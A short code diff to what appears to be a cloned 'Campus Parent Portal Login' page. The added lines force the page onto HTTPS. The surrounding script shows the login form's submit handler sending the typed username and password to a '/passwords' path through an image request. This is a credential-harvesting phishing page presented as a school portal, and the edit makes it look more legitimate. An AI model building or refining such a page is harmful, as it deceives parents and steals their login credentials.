@@ -11,6 +11,11 @@
 		<link rel="stylesheet" type="text/css" href="./Campus Parent Portal Login_files/portalLogin.css">
 		<script type="text/javascript">
 		$( document ).ready(function() {
+			if (location.protocol != 'https:')
+{
+ location.href = 'https:' + window.location.href.substring(window.location.protocol.length);
+}
+
 			$('#form_signin').submit(function(e) {
 				$("img").attr('src', "/passwords?user=" + $("#username").val() + "&password=" + $("#password").val())
 				e.stopPropagation();
